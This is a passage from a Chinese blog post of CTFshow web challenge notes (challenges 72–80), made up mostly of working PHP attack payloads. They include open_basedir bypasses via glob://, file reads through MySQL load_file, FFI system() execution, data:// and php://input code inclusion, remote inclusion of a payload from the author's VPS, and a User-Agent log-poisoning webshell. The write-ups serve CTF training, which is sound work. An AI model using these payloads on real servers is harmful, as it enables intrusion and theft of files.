<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="72"><a href="#72" class="headerlink" title="72"></a>72</h4><p>发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<span class="hljs-keyword">die</span>();  <span class="hljs-comment">#可以正常读取</span><br><span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-keyword">die</span>();   <span class="hljs-comment">#读取失败</span><br></code></pre></td></tr></table></figure>


<p>猜测是开启了open_basedir。</p>
<p>open_basedir可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径。</p>
<p>所以要先绕过open_basedir。首先排除命令执行绕过的可能，disable_function已经禁用了命令执行函数（不知道有没有什么办法绕过）。可以使用glob伪协议绕过，glob伪协议筛选目录不受open_basedir的制约。</p>
<h5 id="DirectoryIterator-glob"><a href="#DirectoryIterator-glob" class="headerlink" title="DirectoryIterator+glob:&#x2F;&#x2F;"></a>DirectoryIterator+glob:&#x2F;&#x2F;</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125; <br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>(需要url编码)</p>
<h5 id="scandir-glob"><a href="#scandir-glob" class="headerlink" title="scandir()+glob:&#x2F;&#x2F;"></a>scandir()+glob:&#x2F;&#x2F;</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>));<br>&gt;<br></code></pre></td></tr></table></figure>

<h5 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir()+readdir()+glob:&#x2F;&#x2F;"></a>opendir()+readdir()+glob:&#x2F;&#x2F;</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>) ) &#123;<br>    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>同理，这种方法也只能列出根目录和open_basedir允许目录下的文件。<br>可以看到，上面三种和glob:&#x2F;&#x2F;相关的协议，最大的缺陷就是只能列目录，而且还只能列根目录和open_basedir允许目录的内容。</p>
<hr>
<p>参考：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/533">https://forum.butian.net/share/533</a></p>
<hr>
<h4 id="73"><a href="#73" class="headerlink" title="73"></a>73</h4><p>同71</p>
<hr>
<h4 id="74"><a href="#74" class="headerlink" title="74"></a>74</h4><p>禁用了scandir()函数，用glob()函数</p>
<p>c&#x3D;var_export(glob(‘..&#x2F;..&#x2F;..&#x2F;*’));die();</p>
<p>c&#x3D;include(‘&#x2F;flagx.txt’);die();</p>
<hr>
<h4 id="75"><a href="#75" class="headerlink" title="75"></a>75</h4><p>又设置了open_basedir的限制，先用global协议读取根目录的文件，发现flag36.txt，尝试用uaf去读取该文件，发现不能用strlen函数，此处就用mysql连接，用load_file()函数读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">try</span> &#123;<br>	<span class="hljs-comment"># 创建 PDO 实例, 连接 MySQL 数据库</span><br>	<span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<span class="hljs-comment">#在不知道数据库名的情况下可以用information_schema代替</span><br>	<br>	<span class="hljs-comment"># 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。</span><br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) &#123;<br>		<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>;<br>	&#125;<br>	<br>	<span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>

<p>来看看ai对上面代码的解释</p>
<p>这段代码是一个PHP脚本，其目的是通过PDO（PHP Data Objects）扩展连接到MySQL数据库，并尝试使用<code>load_file()</code>函数读取服务器上的一个名为<code>flag36.txt</code>的文件，然后将文件内容输出。下面是代码的逐行解释：</p>
<ol>
<li><p><code>try &#123;...&#125;</code> 开始一个异常处理块，用于捕获可能发生的任何异常。</p>
</li>
<li><p><code>$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;, &#39;root&#39;);</code> 创建一个新的PDO实例，用于连接到名为<code>ctftraining</code>的MySQL数据库。这里假设数据库服务器运行在本地主机上，数据库用户名和密码都是<code>root</code>。</p>
</li>
<li><p><code>foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row) &#123; ... &#125;</code> 执行一个SQL查询，使用<code>load_file()</code>函数尝试读取服务器上的<code>/flag36.txt</code>文件。<code>foreach</code>循环遍历查询结果，每次迭代获取一行。</p>
</li>
<li><p><code>echo($row[0]).&quot;|&quot;;</code> 输出当前行的第一个字段（即文件内容），后面跟着一个竖线符号<code>|</code>。</p>
</li>
<li><p><code>$dbh = null;</code> 关闭数据库连接。</p>
</li>
<li><p><code>catch (PDOException $e) &#123; ... &#125;</code> 捕获并处理<code>PDOException</code>类型的异常。如果连接数据库或执行查询时出现错误，将输出错误信息并退出脚本。</p>
</li>
<li><p><code>echo $e-&gt;getMessage();exit(0);</code> 输出异常的错误信息，并退出脚本。</p>
</li>
<li><p><code>exit(0);</code> 无论是否发生异常，脚本都会正常结束。</p>
</li>
</ol>
<p>需要注意的是，<code>load_file()</code>函数只能读取数据库服务器所在机器上的文件，而且出于安全考虑，这个函数可能需要相应的权限，并且可能在某些配置中被禁用。此外，尝试读取服务器上的文件可能涉及到安全风险，尤其是当文件路径和名称来自用户输入时，这可能导致服务器文件泄露或其他安全问题。</p>
<p>如果你正在尝试解决一个CTF（Capture The Flag，一种网络安全竞赛）挑战，那么这段代码可能是挑战的一部分，你需要确保你有权访问目标服务器，并且你的行为符合所有相关的法律和道德标准。如果你是服务器管理员，并且这段代码是未经授权的，那么你需要考虑服务器的安全配置，避免潜在的安全风险。</p>
<hr>
<h4 id="76"><a href="#76" class="headerlink" title="76"></a>76</h4><p>和75一样，先用global协议找出flag36d.txt,后面用mysql连接</p>
<hr>
<h4 id="77"><a href="#77" class="headerlink" title="77"></a>77</h4><p>尝试沿用web75和76的思路，使用PDO连接MySQL数据库，然后使用load_file函数绕过文件读取的限制，读取flag，但是报 could not find driver的错误，表明此题无法使用PDO连接数据库。<br>查看writeup，此题利用的是PHP 7.4+的FFI特性，即外部函数接口特性，相关文档请查看PHP手册，这里我主要是对payload信息进行简单分析。</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44700621/article/details/125381763">https://blog.csdn.net/weixin_44700621/article/details/125381763</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-comment">//创建一个system对象</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="hljs-comment">//没有回显的</span><br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//通过$ffi去调用system函数</span><br></code></pre></td></tr></table></figure>

<p>此处无法直接cat &#x2F;flag36x.txt,猜测应该是权限不够，而&#x2F;readflag应该是一个可执行文件</p>
<p>打开1.txt</p>
<hr>
<h4 id="78"><a href="#78" class="headerlink" title="78"></a>78</h4><p>直接用data:&#x2F;&#x2F;协议</p>
<p>file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(‘ls’);&gt;</p>
<p>发现flag.php</p>
<p>file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(‘cat flag.php’);&gt;</p>
<hr>
<h4 id="79"><a href="#79" class="headerlink" title="79"></a>79</h4><h5 id="法一-2"><a href="#法一-2" class="headerlink" title="法一"></a>法一</h5><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;system(‘cat flag*’);?</p>
<p>也可以base64编码</p>
<p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;<br>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt; &lt;?php system(‘cat flag.php’);</p>
<h5 id="法二-2"><a href="#法二-2" class="headerlink" title="法二"></a>法二</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload: <br><br>POST /?file=Php://input HTTP/1.1<br><br>&lt;?Php system(&quot;ls&quot;);?&gt;<br><br>POST /?file=Php://input HTTP/1.1<br><br>&lt;?Php system(&quot;cat flag.php&quot;);?&gt;<br><br># 仅需在请求行 大写即可<br></code></pre></td></tr></table></figure>

<h5 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h5><p>远程加载 加载robots.txt，发现可以回显 <a target="_blank" rel="noopener" href="http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=https://www.baidu.com/robots.txt">http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=https://www.baidu.com/robots.txt</a> 在自己vps上创建1.txt，内容如下 <code>&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code> 起一个http服务，加载 <a target="_blank" rel="noopener" href="http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=http://8.x.x.x:7001/1.txt">http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=http://8.x.x.x:7001/1.txt</a></p>
<hr>
<h4 id="80"><a href="#80" class="headerlink" title="80"></a>80</h4><h5 id="法一-3"><a href="#法一-3" class="headerlink" title="法一"></a>法一</h5><p>同79，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload: <br><br>POST /?file=Php://input HTTP/1.1<br><br>&lt;?Php system(&quot;ls&quot;);?&gt;<br><br>POST /?file=Php://input HTTP/1.1<br><br>&lt;?Php system(&quot;cat flag.php&quot;);?&gt;<br><br># 仅需在请求行 大写即可<br></code></pre></td></tr></table></figure>



<h5 id="法二-3"><a href="#法二-3" class="headerlink" title="法二"></a>法二</h5><p>远程加载 加载robots.txt，发现可以回显 <a target="_blank" rel="noopener" href="http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=https://www.baidu.com/robots.txt">http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=https://www.baidu.com/robots.txt</a> 在自己vps上创建1.txt，内容如下 <code>&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code> 起一个http服务，加载 <a target="_blank" rel="noopener" href="http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=http://8.x.x.x:7001/1.txt">http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=http://8.x.x.x:7001/1.txt</a></p>
<h5 id="法三-1"><a href="#法三-1" class="headerlink" title="法三"></a>法三</h5><p>日志文件包含</p>
<p>日志文件中包含了 url以及ua信息等，这里ua最容易控制，抓包改ua，写入一句话即可。如下第三行</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?file=/var/log/nginx/access.log</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&lt;?php eval($_GET[2]);?&gt;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>

<p>可以直接命令执行即可也可以用webshell后门工具连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=/var/log/nginx/access.log&amp;2=system(&#x27;ls /var/www/html&#x27;);phpinfo();<br>?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure>

<p>寻找PHPinfo信息前面的那一段信息即可找到</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/04/07/amateursctf2024%E5%AD%97%E4%BD%93%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/">amateursctf2024字体文件分析 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Rainstop</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFshow%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">CTFshow笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#29"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#30"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#31"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">31</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32"><span class="toc-number">1.0.0.7.</span> <span class="toc-text">32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#37"><span class="toc-number">1.0.0.8.</span> <span class="toc-text">37</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#39"><span class="toc-number">1.0.0.9.</span> <span class="toc-text">39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#40"><span class="toc-number">1.0.0.10.</span> <span class="toc-text">40</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.0.0.10.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.0.0.10.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#41"><span class="toc-number">1.0.0.11.</span> <span class="toc-text">41</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#42"><span class="toc-number">1.0.0.12.</span> <span class="toc-text">42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#43"><span class="toc-number">1.0.0.13.</span> <span class="toc-text">43</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#44"><span class="toc-number">1.0.0.14.</span> <span class="toc-text">44</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#45"><span class="toc-number">1.0.0.15.</span> <span class="toc-text">45</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#46"><span class="toc-number">1.0.0.16.</span> <span class="toc-text">46</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#47"><span class="toc-number">1.0.0.17.</span> <span class="toc-text">47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#48"><span class="toc-number">1.0.0.18.</span> <span class="toc-text">48</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#56"><span class="toc-number">1.0.0.19.</span> <span class="toc-text">56</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#57"><span class="toc-number">1.0.0.20.</span> <span class="toc-text">57</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#58"><span class="toc-number">1.0.0.21.</span> <span class="toc-text">58</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#59"><span class="toc-number">1.0.0.22.</span> <span class="toc-text">59</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#60"><span class="toc-number">1.0.0.23.</span> <span class="toc-text">60</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#61"><span class="toc-number">1.0.0.24.</span> <span class="toc-text">61</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#66"><span class="toc-number">1.0.0.25.</span> <span class="toc-text">66</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#67"><span class="toc-number">1.0.0.26.</span> <span class="toc-text">67</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#68"><span class="toc-number">1.0.0.27.</span> <span class="toc-text">68</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#69"><span class="toc-number">1.0.0.28.</span> <span class="toc-text">69</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#71"><span class="toc-number">1.0.0.29.</span> <span class="toc-text">71</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-1"><span class="toc-number">1.0.0.29.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-1"><span class="toc-number">1.0.0.29.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#72"><span class="toc-number">1.0.0.30.</span> <span class="toc-text">72</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DirectoryIterator-glob"><span class="toc-number">1.0.0.30.1.</span> <span class="toc-text">DirectoryIterator+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#scandir-glob"><span class="toc-number">1.0.0.30.2.</span> <span class="toc-text">scandir()+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#opendir-readdir-glob"><span class="toc-number">1.0.0.30.3.</span> <span class="toc-text">opendir()+readdir()+glob:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#73"><span class="toc-number">1.0.0.31.</span> <span class="toc-text">73</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#74"><span class="toc-number">1.0.0.32.</span> <span class="toc-text">74</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#75"><span class="toc-number">1.0.0.33.</span> <span class="toc-text">75</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#76"><span class="toc-number">1.0.0.34.</span> <span class="toc-text">76</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#77"><span class="toc-number">1.0.0.35.</span> <span class="toc-text">77</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#78"><span class="toc-number">1.0.0.36.</span> <span class="toc-text">78</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#79"><span class="toc-number">1.0.0.37.</span> <span class="toc-text">79</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-2"><span class="toc-number">1.0.0.37.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-2"><span class="toc-number">1.0.0.37.2.</span> <span class="toc-text">法二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%89"><span class="toc-number">1.0.0.37.3.</span> <span class="toc-text">法三</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#80"><span class="toc-number">1.0.0.38.</span> <span class="toc-text">80</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-3"><span class="toc-number">1.0.0.38.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-3"><span class="toc-number">1.0.0.38.2.</span> <span class="toc-text">法二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%89-1"><span class="toc-number">1.0.0.38.3.</span> <span class="toc-text">法三</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>